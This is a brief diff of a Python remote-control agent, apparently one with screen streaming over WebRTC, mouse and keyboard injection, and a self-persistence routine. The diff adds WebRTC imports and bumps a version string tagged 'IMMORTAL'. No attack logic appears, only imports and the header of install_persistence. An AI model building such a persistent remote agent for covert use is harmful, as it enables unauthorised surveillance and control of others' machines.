@@ -18,9 +18,10 @@ from PIL import Image, ImageDraw, ImageFont
 from pynput.mouse import Controller as MouseController, Button
 from pynput.keyboard import Controller as KeyboardController, Key
 import av
+from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.0.8-IMMORTAL"
+AGENT_VERSION = "9.1.0-IMMORTAL"
 
 def install_persistence():
     current_exe = sys.executable
